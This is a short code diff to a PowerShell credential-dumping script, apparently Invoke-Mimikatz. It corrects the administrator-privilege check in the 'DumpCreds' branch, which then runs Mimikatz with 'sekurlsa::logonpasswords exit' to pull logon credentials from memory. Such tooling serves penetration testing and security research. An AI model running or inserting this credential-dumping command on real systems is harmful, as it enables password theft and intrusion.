@@ -2707,9 +2707,8 @@ Function Main
 
     if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
     {
-		$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-		$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-		if ($currentPrincipal){
+		$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
+		if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
 			$ExeArgs = "sekurlsa::logonpasswords exit"
 		}
 		else{
